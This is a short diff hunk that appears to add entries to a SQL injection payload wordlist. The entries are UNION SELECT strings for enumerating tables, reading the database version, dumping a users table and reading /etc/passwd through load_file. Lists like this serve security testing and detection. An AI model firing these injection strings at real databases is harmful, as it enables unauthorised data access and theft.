@@ -1,0 +1,7 @@
+UNION ALL SELECT
+\x27UNION SELECT
+) union select * from information_schema.tables;
+union all select @@version--
+union select 1,load_file('/etc/passwd'),1,1,1;
+union select
+union select * from users where login = char ...
